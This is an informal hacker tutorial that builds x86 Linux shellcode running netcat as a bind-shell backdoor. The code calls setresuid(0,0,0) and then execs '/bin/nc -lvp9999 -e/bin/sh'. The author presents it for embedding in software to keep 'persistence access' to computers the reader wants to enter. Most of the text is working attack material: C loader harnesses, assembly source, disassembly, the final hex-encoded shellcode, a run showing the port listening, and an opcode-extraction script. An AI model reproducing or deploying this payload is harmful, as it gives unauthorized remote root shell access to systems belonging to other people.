		     Backdooring Technique with Netcat(Shellcode version)
|=+++++++++++++++++++++++++++=[ Netcat as a shellcode ]=+++++++++++++++++++++++++++=|
|=+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++=|
|=+++++++++++++++++++++++++++=[ flor_iano@hotmail.com ]=+++++++++++++++++++++++++++=|
|=+++++={Greetz to Str0ke, INFOSEC Institute, and to all who read this paper}=+++++=|

Disclaimer:Take Care!
Do not include this program to software, you can go in jail for abuse of privacy,
its a backdoor and you can be detected if you dont know what you do.

-----[ A Introduction - What is Netcat(SwissArmy Knife)?

Netcat is a unix utility wich read and writes data across network connections,
using TCP or UDP protocol. It is designed to be a reliable "back-end" tool that can
be used directly or easily driven by other programs && scripts. It is a feature-rich
network debugging and exploration tool, since it can create almost any kind of connection you would need and has several interesting built-in capabilities. Netcat, or simply "nc" as the actual program is named shoud have been supplied long ago as another one of those cryptic but standart Unix tools.

Netcat is considered on top 20 Network debugging tools, it serve in several ways:
(1)It connects to a server.
(2)Is used as a backdoor.
(3)We get to transfer data(files) with commands.
(4)It can be connected at almost all of the TCP/IP's ports.
(5)ETC.

Nowadays the security administrators should (and is a "must" to)learn using netcat for his simplicity on connecting on others computers.In this paper i will show you the netcat shellcode so you can use it in your software to get a "back-end" port open and have a persistence access to a server or a computer you wish to access to.

-----[ Nasty work
Now, I as computer enthusiast and a software programmer have searched for weeks and weeks on geeting a shellcode for netcat becauze its very hard for this tool since it is a network debugging tool.
First of all we write two C program's to test the shellcode:

#include <stdio.h>  //IO header
#include <string.h> //Functions on favor of strings
#include <stdlib.h> //exit() function
char shellcode[] = ""; 				/* Global array */
int main(int argc, char **argv)
{
	int (*ret)(); 				/* ret is a func pointer*/
	ret = (int(*)())shellcode; 		/* ret points to our shellcode */

	(int)(*ret)();				/* shellcode is type caste as a function */
	exit(0)					/* exit() */
}

And the second program is about the mman.h tester program:

#include <stdio.h>		//IO header
#include <sys/mman.h>		//MMAN sys func
#include <string.h> 		//Functions on favor of strings
#include <stdlib.h>		//Define Var types
#include <unistd.h>		//Defines misc symbolic constants and types, and declares misc functions

int (*shellcodetotest)(); 	/* Global Variable type int, shellcodetotest is a func pointer */

char shellcode[] = "";		/* Global array */

int main(int argc, char **argv)
{
	void *ptr = mmap(0, 150, PROT_EXEC | PROT_WRITE| PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);		/* Mmap functions passed to *ptr pointer */
	if(ptr == MAP_FAILED)
	{
		perror("mmap");	/* Func to error of program */
		exit(-1);
	}

	memcpy(ptr, shellcode, sizeof(shellcode)); /* Memcpy function */
	shellcodetotest = ptr;	/* Here we test the shellcode with mmap functions */
	shellcodetotest();	/* Exec the shellcode */
	return 0;		/* return */
}

So what to do now:
(1) Prepare the C program to exec nc commands.
(2) Test it.
(3) Debug it.

root@MINDZSEC:~# nano ntcat.c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
int main()
{
	setresuid(0,0,0); 	/* Set res UID 0 0 0 to all program */
	char *envp[] = { NULL };
	char *argv[] = {"/bin/nc", "-lvp9999", "-e/bin/sh", NULL};
	int ret = execve("/bin/nc", argv, envp); /* exec the command */
}

Now we compile it:
root@MINDZSEC:~# gcc -S ntcat.c (-S switch for asm lang)
Assemble
root@MINDZSEC:~# as ntcat.s -o ntcat.o
Link it.
root@MINDZSEC:~# ld ntcat.o -o ntcat
Run it
root@MINDZSEC:~# ./ntcat
listening on [any] 9999 ...
Disassemble.
root@MINDZSEC:~# objdump -d ntcat.o

ntcat.o:     file format elf32-i386


Disassembly of section .text:

00000000 <main>:
   0:	55                   	push   %ebp
   1:	89 e5                	mov    %esp,%ebp
   3:	83 e4 f0             	and    $0xfffffff0,%esp
   6:	83 ec 30             	sub    $0x30,%esp
   9:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  10:	00
  11:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  18:	00
  19:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  20:	e8 fc ff ff ff       	call   21 <main+0x21>
  25:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  2c:	00
  2d:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  34:	00
  35:	c7 44 24 1c 08 00 00 	movl   $0x8,0x1c(%esp)
  3c:	00
  3d:	c7 44 24 20 11 00 00 	movl   $0x11,0x20(%esp)
  44:	00
  45:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  4c:	00
  4d:	8d 44 24 28          	lea    0x28(%esp),%eax
  51:	89 44 24 08          	mov    %eax,0x8(%esp)
  55:	8d 44 24 18          	lea    0x18(%esp),%eax
  59:	89 44 24 04          	mov    %eax,0x4(%esp)
  5d:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  64:	e8 fc ff ff ff       	call   65 <main+0x65>
  69:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  6d:	c9                   	leave
  6e:	c3                   	ret
We can strace it to see what syscall's executing.
root@MINDZSEC:~# strace ./ntcat
execve("./ntcat", ["./ntcat"], [/* 31 vars */]) = 0
brk(0)                                  = 0x9966000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7764000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=103011, ...}) = 0
mmap2(NULL, 103011, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb774a000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/i686/cmov/libc.so.6", O_RDONLY) = 3

Here we can see the firs syscall execve executing our program, followed by the opening of the dynamic linker/loader ld.so to load shared libraries.

The opcodes that are presented up have NULLS on it so we must remember a rule to get a shellcode done:
Remember to always use the smallest part of register possible to avoid null's, and xor is your friend.
So I accept that this C programm will not work and we dont have to test it - its simple his opcodes have nulls.So what to do, we go back
to assembly language (the most beautyfull programming language to program shellcodes.

Remember:
(1)You cant have nulls in your shellcode.
(2)You cant use static addresses in your shellcode.
(3)Xor is your friend.

Now get on asm programming language
root@MINDZSEC:~# nano ntcat.asm

jmp short todo
shellcode:
;from man setresuid: setresuid(uid_t ruid, uid_t euid, uid_t suid)
xor eax, eax 		;Zero out eax
xor ebx, ebx		;Zero out ebx
xor ecx, ecx		;Zero out ecx
cdq			;Zero out edx using the sign bit from eax
mov BYTE al, 0xa4 	;setresuid syscall 164 (0xa4)
int 0x80		;syscall execute
pop esi			;esi contain the string in db
xor eax, eax		;Zero out eax
mov[esi + 7], al	;null terminate /bin/nc
mov[esi +  16], al 	;null terminate -lvp90
mov[esi +  26], al	;null terminate -e/bin/sh
mov[esi +  27], esi	;store address of /bin/nc in AAAA
lea ebx, [esi + 8]	;load address of -lvp90 into ebx
mov[esi +31], ebx	;store address of -lvp90 in BBB taken from ebx
lea ebx, [esi + 17]	;load address of -e/bin/sh into  ebx
mov[esi + 35], ebx	;store address of -e/bin/sh in CCCC taken from ebx
mov[esi + 39], eax 	;Zero out DDDD
mov al, 11		;11 is execve  syscakk number
mov ebx, esi		;store address of  /bin/nc
lea ecx, [esi + 27]	;load address of ptr to argv[] array
lea edx, [esi + 39] 	;envp[] NULL
int 0x80		;syscall execute
todo:
call shellcode
db '/bin/nc#-lvp9999#-e/bin/sh#AAAABBBBCCCCDDDD'
;   01234567890123456789012345678901234567890123

So what we done here:
(1)We xor all the eac,ebx,ecx registers.
(2)We write the command in shellcode sections.
call shellcode
db '/bin/nc#-lvp9999#-e/bin/sh#AAAABBBBCCCCDDDD'
;   01234567890123456789012345678901234567890123
(3)We commented down of it number to have a focus on the command.
(4)Then do the dirty programm getting finished.

Now we compile it with nasm program
root@MINDZSEC:~# nasm -f elf ntcat.asm
Disassemble
root@MINDZSEC:~# objdump -d ntcat.o
ntcat.o:     file format elf32-i386


Disassembly of section .text:

00000000 <shellcode-0x2>:
   0:	eb 35                	jmp    37 <todo>

00000002 <shellcode>:
   2:	31 c0                	xor    %eax,%eax
   4:	31 db                	xor    %ebx,%ebx
   6:	31 c9                	xor    %ecx,%ecx
   8:	99                   	cltd
   9:	b0 a4                	mov    $0xa4,%al
   b:	cd 80                	int    $0x80
   d:	5e                   	pop    %esi
   e:	31 c0                	xor    %eax,%eax
  10:	88 46 07             	mov    %al,0x7(%esi)
  13:	88 46 10             	mov    %al,0x10(%esi)
  16:	88 46 1a             	mov    %al,0x1a(%esi)
  19:	89 76 1b             	mov    %esi,0x1b(%esi)
  1c:	8d 5e 08             	lea    0x8(%esi),%ebx
  1f:	89 5e 1f             	mov    %ebx,0x1f(%esi)
  22:	8d 5e 11             	lea    0x11(%esi),%ebx
  25:	89 5e 23             	mov    %ebx,0x23(%esi)
  28:	89 46 27             	mov    %eax,0x27(%esi)
  2b:	b0 0b                	mov    $0xb,%al
  2d:	89 f3                	mov    %esi,%ebx
  2f:	8d 4e 1b             	lea    0x1b(%esi),%ecx
  32:	8d 56 27             	lea    0x27(%esi),%edx
  35:	cd 80                	int    $0x80

00000037 <todo>:
  37:	e8 c6 ff ff ff       	call   2 <shellcode>
  3c:	2f                   	das
  3d:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  40:	2f                   	das
  41:	6e                   	outsb  %ds:(%esi),(%dx)
  42:	63 23                	arpl   %sp,(%ebx)
  44:	2d 6c 76 70 39       	sub    $0x3970766c,%eax
  49:	39 39                	cmp    %edi,(%ecx)
  4b:	39 23                	cmp    %esp,(%ebx)
  4d:	2d 65 2f 62 69       	sub    $0x69622f65,%eax
  52:	6e                   	outsb  %ds:(%esi),(%dx)
  53:	2f                   	das
  54:	73 68                	jae    be <todo+0x87>
  56:	23 41 41             	and    0x41(%ecx),%eax
  59:	41                   	inc    %ecx
  5a:	41                   	inc    %ecx
  5b:	42                   	inc    %edx
  5c:	42                   	inc    %edx
  5d:	42                   	inc    %edx
  5e:	42                   	inc    %edx
  5f:	43                   	inc    %ebx
  60:	43                   	inc    %ebx
  61:	43                   	inc    %ebx
  62:	43                   	inc    %ebx
  63:	44                   	inc    %esp
  64:	44                   	inc    %esp
  65:	44                   	inc    %esp
  66:	44                   	inc    %esp

Here im not making test of running it because i am 100% clearance that it will work so lets gett the shellcode from this object file.
root@MINDZSEC:~# ./xxd-shellcode.sh ntcat.o  "\xeb\x35\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x5e\x31\xc0\x88\x46\x07\x88\x46\x10\x88\x46\x1a\x89\x76\x1b\x8d\x5e\x08\x89\x5e\x1f\x8d\x5e\x11\x89\x5e\x23\x89\x46\x27\xb0\x0b\x89\xf3\x8d\x4e\x1b\x8d\x56\x27\xcd\x80\xe8\xc6\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x76\x70\x39\x39\x39\x39\x23\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44"
This programm, damn it. We got with just a commannd :D..

Now it time to put this shellcode on mman.c test program,i used this because is a syscall function and can be simply works.But,
its not wrong to use the shellcode with the first test program, but mman involve on it, is like a=b b=c a=c so we have a look on strace sig.
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7764000
//Here we saw that mmap2 func is used to exec the program like wise it will do with the first c test programm.
Ok, since we put the shellcode in mman file now have a  look on program:

root@MINDZSEC:~# nano Mmap.c

#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int (*shellcodetotest)();

char shellcode[] = "\xeb\x35\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x5e\x31\xc0\x88\x46\x07\x88\x46\x10\x88\x46\x1a\x89\x76\x1b\x8d\x5e\x08\x89\x5e\x1f\x8d\x5e\x11\x89\x5e\x23\x89\x46\x27\xb0\x0b\x89\xf3\x8d\x4e\x1b\x8d\x56\x27\xcd\x80\xe8\xc6\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x76\x70\x39\x39\x39\x39\x23\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44";

int main(int argc, char **argv) {
	void *ptr = mmap(0, 150, PROT_EXEC | PROT_WRITE| PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
	if(ptr == MAP_FAILED){
		perror("mmap");
		exit(-1);
	}

	memcpy(ptr, shellcode, sizeof(shellcode));
	shellcodetotest = ptr;
	shellcodetotest();
	return 0;
}

root@MINDZSEC:~# gcc Mmap.c -o Mmap
Run
root@MINDZSEC:~# ./Mmap
listening on [any] 9999 ...

Hey we see its listening on port 9999, i used this port on ntcat.asm programm so its working.The assembly is all pretty understendable until you get  down to
the main.There is many ways to make his program more efficent and workable,i simply learnt much about shellcoding and came to this step.This paper can save you lots of time
for making a netcat shellcode, just watch all the paper carefully and see were is your difficulty.Since i exposed my email you can contact on me to answer your questions if you have.
I dont used gdb here cuz with this i meant that the reader who will see this paper can understand programming and its functions.

In someplace in this paper i have include A file called xxd-shellcode.sh it saved me lot of time(5mins) to get the opcodes done:
here you have it:
#!/bin/bash

filename=`echo $1 | sed s/"\.o$"//`
rm -f $filename.shellcode
objdump -d $filename.o | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
echo

Copy it and test it and dont change nothing, anyway you can find this on projectshellcode.com

My Pseudoname is MINDZSEC(flor ian) and i love doing "SHELLCODE".
My another article I think could be "Smashing the stack By me"